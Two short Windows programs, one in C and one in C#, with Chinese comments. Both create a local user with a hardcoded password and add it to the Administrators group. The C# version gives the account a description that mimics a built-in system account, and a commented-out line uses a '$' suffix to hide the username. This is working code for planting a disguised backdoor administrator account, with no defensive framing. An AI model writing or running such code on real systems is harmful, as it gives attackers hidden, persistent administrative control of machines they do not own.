    #ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "netapi32.lib")

#include <windows.h> 
#include <lm.h>

int wmain() {
   USER_INFO_1 ui = {0};
   ui.usri1_name = (wchar_t*)L"admin";  // 用户名
   ui.usri1_password = (wchar_t*)L"P@ssw0rd123!"; // 密码
   ui.usri1_priv = USER_PRIV_USER; 
   ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD; 

   //创建用户
   NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);

   //添加到管理员组
   LOCALGROUP_MEMBERS_INFO_3 account;
   account.lgrmi3_domainandname = ui.usri1_name;
   NetLocalGroupAddMembers(NULL, (LPCWSTR)L"Administrators", 3, (LPBYTE)&account, 1);

   return 0;
}

    using System;
using System.DirectoryServices;

class Class1
{
    static void Main(string[] args)
    {
        try
        {
            string randomStr = new Random().Next(100, 999).ToString();
            //string username = "admin" + randomStr + "$";
            //string password = "Admin." + randomStr;
            string username = "admins";
            string password = "Abc.123";

            DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
            DirectoryEntry NewUser = AD.Children.Add(username, "user");
            NewUser.Invoke("SetPassword", new object[] { password });
            NewUser.Invoke("Put", new object[] { "Description", "系统管理的用户帐户。" });
            NewUser.CommitChanges();
            DirectoryEntry grp;

            grp = AD.Children.Find("Administrators", "group");
            if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
            Console.WriteLine("添加成功");
            Console.WriteLine("User：" + username);
            Console.WriteLine("Password：" + password);
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
    }
}
